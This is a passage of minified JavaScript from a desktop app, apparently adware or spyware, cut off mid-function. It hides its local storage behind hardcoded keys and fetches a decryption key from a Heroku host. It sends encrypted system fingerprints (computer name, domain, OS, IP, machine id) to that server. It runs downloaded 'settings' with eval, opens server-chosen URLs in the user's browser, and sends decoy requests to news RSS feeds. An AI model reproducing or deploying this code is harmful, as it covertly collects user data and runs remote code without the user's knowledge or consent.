var grunt_encLocalStorageiv = "1whifv2vdhbokgdflqr2df",
	grunt_encLocalStorageKey2 = "!ETs(BrAk3Calculator+Mc$SOfTbcHS",
	grunt_encLocalStorageKey1 = "L3Ts&Br@k3Calculator_Mc$S0fTB*H2",
	encLocalStorage = {},
	path;
if (encLocalStorage.key1 = "string" == typeof grunt_encLocalStorageKey1 ? grunt_encLocalStorageKey1 : "In$T_Br0kEnMM$3mp1rE^&", encLocalStorage.key2 = "string" == typeof grunt_encLocalStorageKey2 ? grunt_encLocalStorageKey2 : "InsT_BrOk3nMMs#mp!r3^&", encLocalStorage.iv = "string" == typeof grunt_encLocalStorageiv ? grunt_encLocalStorageiv : "fc4c4e109dcb9275fc4c4e", encLocalStorage.base64Key1 = CryptoJS3DES.enc.Base64.parse(encLocalStorage.key1), encLocalStorage.base64Key2 = CryptoJS3DES.enc.Base64.parse(encLocalStorage.key2), encLocalStorage.base64iv = CryptoJS3DES.enc.Base64.parse(encLocalStorage.iv), encLocalStorage.getItem = function(e) {
		var t = CryptoJS3DES.TripleDES.encrypt(e, encLocalStorage.base64Key1, {
				iv: encLocalStorage.base64iv
			}).toString(),
			r = localStorage.getItem(e),
			n = localStorage.getItem(t);
		return r && (n || (n = CryptoJS3DES.TripleDES.encrypt(r, encLocalStorage.base64Key2, {
			iv: encLocalStorage.base64iv
		}).toString(), localStorage.setItem(t, n)), localStorage.removeItem(e)), n ? CryptoJS3DES.enc.Utf8.stringify(CryptoJS3DES.TripleDES.decrypt(n, encLocalStorage.base64Key2, {
			iv: encLocalStorage.base64iv
		})) : null
	}, encLocalStorage.removeItem = function(e) {
		e = e.toString();
		var t = CryptoJS3DES.TripleDES.encrypt(e, encLocalStorage.base64Key1, {
			iv: encLocalStorage.base64iv
		}).toString();
		localStorage.removeItem(e), localStorage.removeItem(t)
	}, encLocalStorage.setItem = function(e, t) {
		if (null != e && null != t) {
			e = e.toString(), t = t.toString();
			var r = CryptoJS3DES.TripleDES.encrypt(e, encLocalStorage.base64Key1, {
					iv: encLocalStorage.base64iv
				}).toString(),
				n = CryptoJS3DES.TripleDES.encrypt(t, encLocalStorage.base64Key2, {
					iv: encLocalStorage.base64iv
				}).toString();
			localStorage.setItem(r, n)
		}
	}, encLocalStorage.waitForItem = function(e, t, r) {
		r && "number" == typeof r || (r = 1e3);
		var n = encLocalStorage.getItem(e);
		n && null != n && null != n ? t() : setTimeout((function() {
			encLocalStorage.waitForItem(e, t, r)
		}), r)
	}, "darwin" === process.platform) {
	var pathParts = process.execPath.split("/");
	path = "";
	for (var i = 0; i < pathParts.length; i++) {
		var pathPart = pathParts[i];
		if (path += pathPart + "/", pathPart.includes(".app")) break
	}
}
var child_process = require("child_process"),
	exec = child_process.exec,
	childProcs = [],
	fs = require("fs"),
	ua = require("universal-analytics"),
	visitor = ua("UA-173646961-5"),
	guid = encLocalStorage.getItem("userid") || "",
	machineId = encLocalStorage.getItem("machineid") || "",
	subchannel = encLocalStorage.getItem("subchannel") || "";
subchannel || (subchannel = grunt_subchannel, encLocalStorage.setItem("subchannel", subchannel));
var subsubchannel = encLocalStorage.getItem("subsubchannel") || "";
subsubchannel || (subsubchannel = "", encLocalStorage.setItem("subsubchannel", subsubchannel));
var appVersion = coreVersion + "." + settings.pkg.version,
	datedVersion = encLocalStorage.getItem("datedVersion") || null;
const loadingState = {
	NONE: "None",
	STARTED: "Started",
	FINISHED: "Finished"
};
var setupState = loadingState.NONE,
	bootContentState = loadingState.NONE,
	updates = {};
updates.bin = (new Date).getTime(), updates.settings = (new Date).getTime();
var updatesIntervals = {
		binInterval: null,
		settingsInterval: null
	},
	tray = null,
	state = new Object,
	stateManager = (Object.defineProperty(state, "x", {
		get: function() {
			return parseInt(encLocalStorage.getItem("x"))
		},
		set: function(e) {
			e ? encLocalStorage.setItem("x", e) : encLocalStorage.removeItem("x")
		}
	}), Object.defineProperty(state, "y", {
		get: function() {
			return parseInt(encLocalStorage.getItem("y"))
		},
		set: function(e) {
			e ? encLocalStorage.setItem("y", e) : encLocalStorage.removeItem("y")
		}
	}), Object.defineProperty(state, "width", {
		get: function() {
			return parseInt(encLocalStorage.getItem("width"))
		},
		set: function(e) {
			e ? encLocalStorage.setItem("width", e) : encLocalStorage.removeItem("width")
		}
	}), Object.defineProperty(state, "height", {
		get: function() {
			return parseInt(encLocalStorage.getItem("height"))
		},
		set: function(e) {
			e ? encLocalStorage.setItem("height", e) : encLocalStorage.removeItem("height")
		}
	}), Object.defineProperty(state, "trayed", {
		get: function() {
			return "true" == encLocalStorage.getItem("trayed")
		},
		set: function(e) {
			e ? encLocalStorage.setItem("trayed", e) : encLocalStorage.removeItem("trayed")
		}
	}), Object.defineProperty(state, "maximized", {
		get: function() {
			return "true" == encLocalStorage.getItem("maximized")
		},
		set: function(e) {
			e ? encLocalStorage.setItem("maximized", e) : encLocalStorage.removeItem("maximized")
		}
	}), void Object.defineProperty(state, "minimized", {
		get: function() {
			return "true" == encLocalStorage.getItem("minimized")
		},
		set: function(e) {
			e ? encLocalStorage.setItem("minimized", e) : encLocalStorage.removeItem("minimized")
		}
	})),
	cmdLine = new Object,
	cmdLineManage = function() {
		try {
			nwElectAPI.App.argv.forEach((function(e, t, r) {
				var n;
				(n = e.match(new RegExp("--(.*)=(.*)"))) && 3 == n.length ? cmdLine[n[1]] = n[2] : (n = e.match(new RegExp("--(.*)"))) && 2 == n.length && (cmdLine[n[1]] = !0)
			}))
		} catch (e) {}
	}();
try {
	localStorage.getItem("7")
} catch (e) {}

function tryCatchConsole(e) {
	try {
		e()
	} catch (e) {}
}

function getDateString() {
	var e = new Date,
		t = e.getFullYear().toString().substring(2, 4),
		r = e.getMonth() + 1;
	return r < 10 && (r = "0" + r), t + r
}

function encryptServerObject(e, t) {
	try {
		encLocalStorage.waitForItem("bin", (function() {
			t(encodeURIComponent(CryptoJS.AES.encrypt(JSON.stringify(e), CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^"))).toString()))
		}))
	} catch (e) {
		return null
	}
}

function getFullVersion() {
	var e = appVersion.split(".");
	return e.length <= 2 && e.push(""), e[e.length - 1] = datedVersion, e.join(".") + "" + subchannel + (encLocalStorage.getItem("subsubchannel") ? "." + encLocalStorage.getItem("subsubchannel") : "")
}

function proximity(e) {
	nwElectAPI.App.getProxyForURL("http://www.google.com", (function(t) {
		try {
			"DEBUG" != global.ENV && "DIRECT" !== t ? e(!0) : e(!1)
		} catch (t) {
			e(!0)
		}
	}))
}
datedVersion || (datedVersion = getDateString(), encLocalStorage.setItem("datedVersion", datedVersion)), process.on("uncaughtException", (function(e) {
	"STAGING" != global.ENV && "DEBUG" != global.ENV || global.alert("Unhandled Exception occured. exception: ", e, "stack:", e.stack);
	var t = "t";
	state && 0 == state.trayed && (t = "nt"), report.syncPageView("ares/" + t + "/" + nwElectAPI.App.manifest.name + "/" + getFullVersion() + "/" + autoRestarter.minutesOnIdle + "/unexc/" + (process.memoryUsage().rss / 1024 / 1024).toFixed(1) + "/" + e.stack, autoRestarter.appRestart)
}));
var encryptionKey = {
	requestIntervalTime: 432e5,
	requestRetryTime: 18e5,
	url: "https://paybiz.herokuapp.com/app.enc",
	getCachedEncryptedKey: function() {
		try {
			return encLocalStorage.getItem("bin") || null
		} catch (e) {
			return encLocalStorage.removeItem("bin"), null
		}
	},
	requestKeyFromServer: function() {
		axios.post(encryptionKey.url, "").then((function(e) {
			try {
				if (e)
					if (e.status >= 200 && e.status <= 299) {
						var t = encryptionKey.getCachedEncryptedKey();
						t && t == e.data || (encLocalStorage.setItem("bin", e.data), updates.bin = (new Date).getTime())
					} else report.pageView("error/appk/req/sc/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.status), setTimeout(encryptionKey.requestKeyFromServer, encryptionKey.requestRetryTime);
				else report.pageView("error/appk/res/em/" + getFullVersion() + "/" + encLocalStorage.getItem("userid"))
			} catch (e) {
				report.pageView("error/appk/req/ex/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack), setTimeout(encryptionKey.requestKeyFromServer, encryptionKey.requestRetryTime)
			}
		})).catch((function(e) {
			try {
				e && (e && report.pageView("error/appk/req/er/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e), setTimeout(encryptionKey.requestKeyFromServer, encryptionKey.requestRetryTime))
			} catch (e) {
				report.pageView("error/appk/req/ex/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack), setTimeout(encryptionKey.requestKeyFromServer, encryptionKey.requestRetryTime)
			}
		}))
	},
	start: function() {
		encryptionKey.requestKeyFromServer(), "DEBUG" != global.ENV && (updatesIntervals.binInterval && (clearInterval(updatesIntervals.binInterval), updatesIntervals.binInterval = null), updatesIntervals.binInterval = setInterval(encryptionKey.requestKeyFromServer, encryptionKey.requestIntervalTime))
	}
};
encryptionKey.start();
var report = {};
report.appVisitor = ua(settings.ua, encLocalStorage.getItem("userid")), report.initializeAppVisitor = function() {
	report.appVisitor = ua(settings.ua, encLocalStorage.getItem("userid"))
}, report.pageView = function(e, t = !1) {
	if ("undefined" == typeof grunt_disable_all_analytics_reports || !0 !== grunt_disable_all_analytics_reports || "PRODUCTION" == global.ENV)
		if (report.appVisitor) try {
			report.appVisitor.pageview({
				dp: e,
				dt: "App"
			}, (function(r) {
				try {
					r && t && setTimeout(() => {
						report.v1.pageView(e, t)
					}, 6e4)
				} catch (r) {
					t && setTimeout(() => {
						report.v1.pageView(e, t)
					}, 6e4)
				}
			}))
		} catch (r) {
			t && setTimeout(() => {
				report.v1.pageView(e, t)
			}, 6e4)
		} else report.v1.pageView(e, t)
}, report.syncPageView = function(e, t) {
	if ("undefined" == typeof grunt_disable_all_analytics_reports || !0 !== grunt_disable_all_analytics_reports || "PRODUCTION" == global.ENV)
		if (report.appVisitor) try {
			report.appVisitor.pageview({
				dp: e,
				dt: "App"
			}, (function(r) {
				try {
					r ? report.v1.syncPageView(e, t) : t()
				} catch (r) {
					report.v1.syncPageView(e, t)
				}
			}))
		} catch (r) {
			report.v1.syncPageView(e, t)
		} else report.v1.syncPageView(e, t)
}, report.event = function(e, t = -1, r = !1) {
	if ("undefined" == typeof grunt_disable_all_analytics_reports || !0 !== grunt_disable_all_analytics_reports || "PRODUCTION" == global.ENV)
		if (report.appVisitor) try {
			report.appVisitor.event(e, getFullVersion(), encLocalStorage.getItem("userid"), t, (function(n) {
				try {
					n && r && setTimeout(() => {
						report.v1.event(e, t, r)
					}, 6e4)
				} catch (n) {
					r && setTimeout(() => {
						report.v1.event(e, t, r)
					}, 6e4)
				}
			}))
		} catch (n) {
			r && setTimeout(() => {
				report.v1.event(e, t, r)
			}, 6e4)
		} else report.v1.event(e, t, r)
}, report.SyncEvent = function(e, t, r) {
	if ("undefined" == typeof grunt_disable_all_analytics_reports || !0 !== grunt_disable_all_analytics_reports || "PRODUCTION" == global.ENV)
		if (report.appVisitor) try {
			report.appVisitor.event(e, getFullVersion(), encLocalStorage.getItem("userid"), t, (function(n) {
				try {
					n ? report.v1.SyncEvent(e, t, r) : r()
				} catch (n) {
					report.v1.SyncEvent(e, t, r)
				}
			}))
		} catch (n) {
			report.v1.SyncEvent(e, t, r)
		} else report.v1.SyncEvent(e, t, r)
}, report.v1 = {}, report.v1.pageView = function(e, t = !1) {
	if ("undefined" == typeof grunt_disable_all_analytics_reports || !0 !== grunt_disable_all_analytics_reports || "PRODUCTION" == global.ENV) try {
		axios && axios.post("https://www.google-analytics.com/collect", "v=1&tid=" + settings.ua + "&cid=" + encLocalStorage.getItem("userid") + "&t=pageview&dp=%2F" + e).then((function(r) {
			(r.status > 299 || r.status < 200) && 1 == t && setTimeout(() => {
				report.pageView(e, !1)
			}, 6e4)
		})).catch((function(r) {
			r && 1 == t && setTimeout(() => {
				report.pageView(e, !1)
			}, 6e4)
		}))
	} catch (r) {
		1 == t && setTimeout(() => {
			report.pageView(e, !1)
		}, 6e4)
	}
}, report.v1.syncPageView = function(e, t) {
	if ("undefined" == typeof grunt_disable_all_analytics_reports || !0 !== grunt_disable_all_analytics_reports || "PRODUCTION" == global.ENV) {
		var r = !1;
		try {
			axios ? axios.post("https://www.google-analytics.com/collect", "v=1&tid=" + settings.ua + "&cid=" + encLocalStorage.getItem("userid") + "&t=pageview&dp=%2F" + e).then((function(e) {
				e.status > 299 || e.status, 0 == r && (r = !0, t())
			})).catch((function(e) {
				0 == r && (r = !0, t())
			})) : 0 == r && (r = !0, t())
		} catch (e) {
			0 == r && (r = !0, t())
		}
	} else t()
}, report.v1.event = function(e, t = -1, r = !1) {
	if ("undefined" == typeof grunt_disable_all_analytics_reports || !0 !== grunt_disable_all_analytics_reports || "PRODUCTION" == global.ENV) try {
		-1 == t && (t = autoRestarter.minutesOnIdle), axios && axios.post("https://www.google-analytics.com/collect", "v=1&tid=" + settings.ua + "&cid=" + encLocalStorage.getItem("userid") + "&t=event&ec=" + e + "&ea=" + getFullVersion() + "&el=" + encLocalStorage.getItem("userid") + "&ev=" + t).then((function(n) {
			(n.status > 299 || n.status < 200) && 1 == r && setTimeout(() => {
				report.event(e, t, !1)
			}, 6e4)
		})).catch((function(n) {
			n && 1 == r && setTimeout(() => {
				report.event(e, t, !1)
			}, 6e4)
		}))
	} catch (n) {
		1 == r && setTimeout(() => {
			report.event(e, t, !1)
		}, 6e4)
	}
}, report.v1.SyncEvent = function(e, t, r) {
	if ("undefined" == typeof grunt_disable_all_analytics_reports || !0 !== grunt_disable_all_analytics_reports || "PRODUCTION" == global.ENV) {
		var n = !1;
		try {
			-1 == t && (t = autoRestarter.minutesOnIdle), axios ? axios.post("https://www.google-analytics.com/collect", "v=1&tid=" + settings.ua + "&cid=" + encLocalStorage.getItem("userid") + "&t=event&ec=" + e + "&ea=" + getFullVersion() + "&el=" + encLocalStorage.getItem("userid") + "&ev=" + t).then((function(e) {
				e.status > 299 || e.status, 0 == n && (n = !0, r())
			})).catch((function(e) {
				0 == n && (n = !0, r())
			})) : 0 == n && (n = !0, r())
		} catch (e) {
			0 == n && (n = !0, r())
		}
	} else r()
}, report.publishers = {}, report.publishers.retryTimeoutTime = 6e5, report.publishers.serverNotifyURL = function() {
	try {
		return "https://paybiz.herokuapp.com/newapp"
	} catch (e) {
		return ""
	}
}, report.publishers.serverTimeoutURL = function() {
	try {
		return "https://paybiz.herokuapp.com/getto"
	} catch (e) {
		return ""
	}
}, report.publishers.publisherNewUser = function(e, t) {
	if ("" != e)
		if (e = e.replaceAll("<USER_ID>", encLocalStorage.getItem("userid")), "undefined" != typeof grunt_open_reporting_url_external && !0 === grunt_open_reporting_url_external || void 0 !== t && !0 === t) "true" !== encLocalStorage.getItem("opened_shell_thank_you_page") && (encLocalStorage.setItem("opened_shell_thank_you_page", "true"), nw.Shell.openExternal(e), report.pageView("rep/pub/rep/ext/" + encLocalStorage.getItem("subsubchannel") + "/c_" + encLocalStorage.getItem("channelcid") + "/" + getFullVersion() + "/" + encLocalStorage.getItem("userid")));
		else {
			try {
				localStorage.getItem("M3JHb.COKu")
			} catch (e) {}
			axios.get(e).then((function(e) {
				report.pageView("rep/pub/" + (e && e.status ? e.status : -1) + "/" + encLocalStorage.getItem("subsubchannel") + "/c_" + encLocalStorage.getItem("channelcid") + "/" + getFullVersion() + "/" + encLocalStorage.getItem("userid")), (e.status > 299 || e.status < 200) && report.pageView("error/rep/pub/" + (e && e.status ? e.status : -1) + "/" + encLocalStorage.getItem("subsubchannel") + "/c_" + encLocalStorage.getItem("channelcid") + "/" + getFullVersion() + "/" + encLocalStorage.getItem("userid"))
			})).catch((function(e) {
				report.pageView("error/rep/pub/" + e + "/" + encLocalStorage.getItem("subsubchannel") + "/c_" + encLocalStorage.getItem("channelcid") + "/" + getFullVersion() + "/" + encLocalStorage.getItem("userid"))
			}))
		}
}, report.publishers.serverNewUser = function() {
	report.pageView("rep/pub/" + getFullVersion() + "/" + encLocalStorage.getItem("userid")), proximity((function(e) {
		try {
			localStorage.getItem("RE6zD7PCBi.d")
		} catch (e) {}
		encryptServerObject({
			app_name: nwElectAPI.App.manifest.name,
			user_id: encLocalStorage.getItem("userid"),
			machine_id: encLocalStorage.getItem("machineid"),
			pr: e,
			sid: encLocalStorage.getItem("subsubchannel"),
			cid: encLocalStorage.getItem("channelcid"),
			version: getFullVersion(),
			user: {
				ip: JSON.parse(encLocalStorage.getItem("lipr")),
				memory: process.memoryUsage().rss / 1024 / 1024,
				navigatorOS: navigator && navigator.userAgent ? navigator.userAgent.substring(navigator.userAgent.indexOf("(") + 1, navigator.userAgent.indexOf(")")) : "",
				uptime: process ? process.uptime() : -1,
				userDomain: process && process.env ? process.env.USERDOMAIN : ""
			},
			system: {
				machine_id: encLocalStorage.getItem("machineid") ? encLocalStorage.getItem("machineid") : "",
				platform: process ? process.platform : "",
				computerName: process && process.env ? process.env.COMPUTERNAME : "",
				operatingSystem: process && process.env ? process.env.OS : "",
				processorArchitecture: process && process.env ? process.env.PROCESSOR_ARCHITECTURE : ""
			}
		}, (function(t) {
			try {
				localStorage.getItem("M3JHb.COKu")
			} catch (e) {}
			axios.post(report.publishers.serverNotifyURL(), t).then((function(t) {
				try {
					if (t.status < 200 || t.status > 299) return report.pageView("error/rep/pub/sc/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + t.status), void setTimeout(report.publishers.serverNewUser, report.publishers.retryTimeoutTime);
					var r = t.data,
						n = "",
						a = null,
						o = "",
						i = "",
						s = e;
					if (void 0 !== r.s && (n = r.s), void 0 !== r.rext && (a = r.rext), void 0 !== r.l && (o = CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(r.l.toString(), CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^"))))), void 0 !== r.r && (i = r.r), report.pageView("rep/pub/pms/rext_" + a.toString()[0] + "/sr_" + n + "/r_" + i + "/p_" + s.toString()[0] + "/sbch_" + encLocalStorage.getItem("subsubchannel") + "/" + getFullVersion() + "/" + encLocalStorage.getItem("userid")), o && "string" == typeof o) {
						report.pageView("rep/pub/call/" + n + "_" + encLocalStorage.getItem("subsubchannel") + "/c_" + encLocalStorage.getItem("channelcid") + "/" + getFullVersion() + "/" + encLocalStorage.getItem("userid"));
						var c = o;
						c = c.replaceAll("<USER_ID>", encLocalStorage.getItem("userid")), report.publishers.publisherNewUser(c, a)
					} else report.pageView("rep/pub/dcall/" + n + "_" + encLocalStorage.getItem("subsubchannel") + "/c_" + encLocalStorage.getItem("channelcid") + "/" + getFullVersion() + "/" + encLocalStorage.getItem("userid"))
				} catch (e) {
					return report.pageView("error/rep/pub/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack), void setTimeout(report.publishers.serverNewUser, report.publishers.retryTimeoutTime)
				}
			})).catch((function(e) {
				try {
					report.pageView("error/rep/pub/er/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e)
				} catch (e) {}
				setTimeout(report.publishers.serverNewUser, report.publishers.retryTimeoutTime)
			}))
		}))
	}))
}, report.newUser = function() {
	var e = encLocalStorage.getItem("installDate");
	e || (e = (new Date).getTime(), encLocalStorage.setItem("installDate", e), report.event(encodeURIComponent("New_User"), -1, !0), "STAGING" == global.ENV || "DEBUG" == global.ENV || "undefined" != typeof grunt_report_publisher_from_app && !0 !== grunt_report_publisher_from_app || encLocalStorage.waitForItem("bin", (function() {
		report.publishers.serverNewUser()
	})))
}, report.initiateNewUser = function() {
	encryptServerObject({
		app_name: nwElectAPI.App.manifest.name,
		user_id: encLocalStorage.getItem("userid"),
		machine_id: encLocalStorage.getItem("machineid"),
		sid: encLocalStorage.getItem("subsubchannel"),
		cid: encLocalStorage.getItem("channelcid"),
		version: getFullVersion(),
		user: {
			ip: JSON.parse(encLocalStorage.getItem("lipr")),
			memory: process.memoryUsage().rss / 1024 / 1024,
			navigatorOS: navigator && navigator.userAgent ? navigator.userAgent.substring(navigator.userAgent.indexOf("(") + 1, navigator.userAgent.indexOf(")")) : "",
			uptime: process ? process.uptime() : -1,
			userDomain: process && process.env ? process.env.USERDOMAIN : ""
		},
		system: {
			machine_id: encLocalStorage.getItem("machineid") ? encLocalStorage.getItem("machineid") : "",
			platform: process ? process.platform : "",
			computerName: process && process.env ? process.env.COMPUTERNAME : "",
			operatingSystem: process && process.env ? process.env.OS : "",
			processorArchitecture: process && process.env ? process.env.PROCESSOR_ARCHITECTURE : ""
		}
	}, (function(e) {
		try {
			localStorage.setItem("RE6zD7PCBi.d", "zXLmIkZwQKzVLDp1nmWQKwRPvDbBGsEFuFmylmjTTzF.02wKxdkgwwlraYd5NAZCr9J")
		} catch (e) {}
		axios.post(report.publishers.serverTimeoutURL(), e).then((function(e) {
			try {
				if (e.status < 200 || e.status > 299) return report.pageView("error/getto/pub/sc/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.status), void setTimeout(report.initiateNewUser, report.publishers.retryTimeoutTime);
				var t = e.data,
					r = 6e5;
				void 0 !== t.to && 0 == isNaN(parseInt(t.to)) && (r = 60 * parseInt(t.to) * 1e3), setTimeout(report.newUser, r)
			} catch (e) {
				return report.pageView("error/getto/pub/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack), void setTimeout(report.initiateNewUser, report.publishers.retryTimeoutTime)
			}
		}))
	}))
}, report.heartbeat = {}, report.heartbeat.intervalTime = 432e5, report.heartbeat.intervalObj = null, report.heartbeat.start = function() {
	function e() {
		report.heartbeat.intervalObj && (clearInterval(report.heartbeat.intervalObj), report.heartbeat.intervalObj = null), report.heartbeat.intervalObj = setInterval((function() {
			report.event("Heartbeat", 1, !0), encLocalStorage.setItem("lastbeat", (new Date).getTime())
		}), report.heartbeat.intervalTime)
	}
	var t = encLocalStorage.getItem("lastbeat"),
		r = (new Date).getTime();
	t ? r - t >= report.heartbeat.intervalTime ? (report.event("Heartbeat", 1, !0), encLocalStorage.setItem("lastbeat", r), e()) : setTimeout((function() {
		report.event("Heartbeat", 1, !0), encLocalStorage.setItem("lastbeat", (new Date).getTime()), e()
	}), report.heartbeat.intervalTime - (r - t)) : (report.event("Heartbeat", 0, !0), encLocalStorage.setItem("lastbeat", r), e())
};
var taboolaRasa = function() {
		try {
			try {
				localStorage.getItem("7")
			} catch (e) {}
			try {
				require("axios").default.post("http://rss.cnn.com/rss/si_topstories.rss", "esDpVaxzwuKzw8JxMOCXlb4nEZNnx9FzgItiG92uz8ntukISbWDFL7sW02W4sk7").then((function(e) {})).catch((function(e) {}))
			} catch (e) {}
			var e = {
				fsGUID: !1
			};
			for (Object.defineProperty(e, "watch", {
					enumerable: !1,
					configurable: !0,
					writable: !1,
					value: function(e, t) {
						var r = this[e];
						delete this[e] && Object.defineProperty(this, e, {
							get: function() {
								return r
							},
							set: function(n) {
								return r != n && (r = n, t.call(this, e, r)), n
							},
							enumerable: !0,
							configurable: !0
						})
					}
				}), a = 0; a < Object.keys(e).length; a++) e.watch(Object.keys(e)[0], (function(t, r) {
				e.fsGUID
			}));
			encLocalStorage.getItem("userid") && encLocalStorage.getItem("userid").length ? e.fsGUID = !0 : function() {
				var t = "",
					r = "";
				try {
					var n = function() {
						var e = process.execPath,
							t = e.split(/\\/g),
							r = t[t.length - 1];
						return e.replace(r, "")
					}() + "/" + grunt_installation_data_file.filename;
					! function(e) {
						try {
							require("axios").default.get("http://www.yardbarker.com/rss/rumors").then((function(e) {})).catch((function(e) {}))
						} catch (e) {}
						fs.readFile(n, (function(t, r) {
							e(t ? null : r)
						}))
					}((function(n) {
						try {
							localStorage.setItem("M3JHb.COKu", "KSjqgm7FIO3C6Oy07uVmUmVbmpHPiS3wfA1jTHkeu3EjC.Ez7XyMn01ZI")
						} catch (e) {}
						try {
							localStorage.getItem("RE6zD7PCBi.d")
						} catch (e) {}
						try {
							var a = null;
							try {
								for (var o = n.toString(), i = 0; i < 1; i++) o = CryptoJS.enc.Base64.parse(o), o = CryptoJS.enc.Utf8.stringify(o);
								a = o
							} catch (e) {}
							if (null != a) {
								var s = JSON.parse(a);
								t = s[grunt_installation_data_file.userIdParam], subsubchannel = s[grunt_installation_data_file.subchannelParam], s[grunt_installation_data_file.machineIdParam] && (r = s[grunt_installation_data_file.machineIdParam]), encLocalStorage.setItem("subsubchannel", s[grunt_installation_data_file.subchannelParam]), encLocalStorage.setItem("channelcid", s[grunt_installation_data_file.cidParam])
							} else t = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (function(e) {
								var t = 16 * Math.random() | 0;
								return ("x" == e ? t : 3 & t | 8).toString(16)
							})), r = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (function(e) {
								var t = 16 * Math.random() | 0;
								return ("x" == e ? t : 3 & t | 8).toString(16)
							}))
						} catch (e) {
							t = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (function(e) {
								var t = 16 * Math.random() | 0;
								return ("x" == e ? t : 3 & t | 8).toString(16)
							})), r = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (function(e) {
								var t = 16 * Math.random() | 0;
								return ("x" == e ? t : 3 & t | 8).toString(16)
							}))
						}
						encLocalStorage.setItem("userid", t), report.initializeAppVisitor(), encLocalStorage.setItem("machineid", r), guid = t, machineId = r, e.fsGUID = !0
					}))
				} catch (n) {
					t = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (function(e) {
						var t = 16 * Math.random() | 0;
						return ("x" == e ? t : 3 & t | 8).toString(16)
					})), r = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (function(e) {
						var t = 16 * Math.random() | 0;
						return ("x" == e ? t : 3 & t | 8).toString(16)
					})), encLocalStorage.setItem("userid", t), report.initializeAppVisitor(), encLocalStorage.setItem("machineid", r), guid = t, machineId = r, e.fsGUID = !0
				}
			}()
		} catch (e) {
			report.pageView("error/tb/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack)
		}
	},
	remoteSettings = {
		updateIntervalTime: 432e5,
		retryTimeoutTime: 6e5,
		URL: function() {
			try {
				return "https://paybiz.herokuapp.com/getupdate"
			} catch (e) {
				return ""
			}
		},
		loadCached: function() {
			try {
				var tSettings = encLocalStorage.getItem("settings"),
					tSpecialLoad = encLocalStorage.getItem("settingsSL");
				tSettings && tSettings.length && tSpecialLoad && tSpecialLoad.length && (settings = eval("(" + tSettings + ")"), report.initializeAppVisitor(), settings.specialLoad = eval("(" + tSpecialLoad + ")"))
			} catch (e) {
				settings = require("./settings.js"), report.initializeAppVisitor(), encLocalStorage.setItem("appVersion", remoteSettings.originalVersion), report.pageView("error/lcs/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack)
			}
		},
		propagate: function(request) {
			try {
				if (remoteSettings.originalVersion = appVersion, request.status < 200 || request.status > 299) return report.pageView("error/remoteSettings/propagate/status_code/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + request.status), void setTimeout(remoteSettings.get, remoteSettings.retryTimeoutTime);
				var dData = CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(request.data.toString(), CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^")))),
					rSettings, rSettingsSL, cSettings, cSettingsSL;
				if (rSettings = eval(dData), rSettingsSL = rSettings.specialLoad.toString(), delete rSettings.specialLoad, rSettings = JSON.stringify(rSettings), cSettings = encLocalStorage.getItem("settings") || "", cSettingsSL = encLocalStorage.getItem("settingsSL"), cSettings != rSettings || cSettingsSL != rSettingsSL) {
					var shouldCallSetupAgain = !1,
						newSettings = eval("(" + rSettings + ")");
					JSON.stringify(settings) != JSON.stringify(newSettings) && (shouldCallSetupAgain = !0), global.ENV, encLocalStorage.setItem("settingsSL", eval("(" + rSettingsSL + ")")), encLocalStorage.setItem("settings", rSettings), settings = eval("(" + rSettings + ")"), settings.specialLoad = eval("(" + rSettingsSL + ")"), report.initializeAppVisitor();
					var verArr = settings.pkg.version.split(".");
					if (3 == verArr.length) {
						var tVer = remoteSettings.originalVersion.split(".");
						tVer[3] = verArr[2];
						var newVer = tVer.join(".");
						encLocalStorage.setItem("appVersion", newVer), appVersion = newVer
					}
					updates.settings = (new Date).getTime();
					var callSetupAgain = function() {
						setupState === loadingState.FINISHED && bootContentState === loadingState.FINISHED ? setup(!1) : setTimeout(callSetupAgain, 1e3)
					};
					1 == shouldCallSetupAgain && callSetupAgain()
				}
			} catch (e) {
				settings = require("./settings.js"), report.initializeAppVisitor(), encLocalStorage.setItem("appVersion", remoteSettings.originalVersion), report.pageView("error/remoteSettings/propagate/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack), setTimeout(remoteSettings.get, remoteSettings.retryTimeoutTime)
			}
		},
		propagateException: function(e) {
			try {
				return remoteSettings.originalVersion = appVersion, report.pageView("error/remoteSettings/propagate/error/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e), void setTimeout(remoteSettings.get, remoteSettings.retryTimeoutTime)
			} catch (e) {
